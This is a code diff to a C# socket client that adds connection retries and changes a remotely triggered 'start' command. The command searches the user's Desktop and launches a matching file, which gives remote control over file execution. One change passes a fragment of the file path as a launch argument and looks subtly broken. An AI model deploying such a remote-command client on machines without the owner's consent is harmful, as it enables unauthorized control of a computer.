@@ -7,6 +7,7 @@ using System.Net.Sockets;
 using System.Security.AccessControl;
 using System.Security.Permissions;
 using System.Text;
+using System.Threading;
 
 namespace ClientProject
 {
@@ -34,7 +35,32 @@ namespace ClientProject
 
         public void Connect()
         {
-            socket.Connect(iPEndPoint);
+            int exit = 0;
+            bool trycon = false;
+            do
+            {
+                try
+                {
+                    socket.Connect(iPEndPoint);
+                    trycon = true;
+                    Console.WriteLine("Connect success!");
+                }
+                catch (Exception)
+                {
+
+                    Console.WriteLine("Try to connect...");
+                    exit++;
+                    Thread.Sleep(700);
+                   
+                }
+                if (exit == 5)
+                {
+                    Console.WriteLine("Try to Connect Failed");
+                    Thread.Sleep(1000);
+                    Environment.Exit(0);
+                }
+            } while (!trycon);
+            Console.Clear();
         }
         public void SendMsg(string sms)
         {
@@ -90,6 +116,7 @@ namespace ClientProject
             }
             if (arr_command[0] == "start")
             {
+                string[] arg = { };
                 try
                 {
                     tmp = Directory.GetFiles(@$"C:\Users\" + $"{Environment.UserName}" + @"\Desktop", "*", SearchOption.AllDirectories);
@@ -98,7 +125,8 @@ namespace ClientProject
                     {
                         if (item.ToLower().EndsWith(arr_command[1].ToLower()))
                         {
-                            Process.Start(item);
+                            arg = item.Split(".");
+                            Process.Start(new ProcessStartInfo(item, arg[1]) { UseShellExecute = true });
                             SendMsg("Success start!");
                             break;
                         }
@@ -108,6 +136,7 @@ namespace ClientProject
                 catch (Exception ex)
                 {
                     SendMsg(ex.Message);
+
                 }
             }
             else
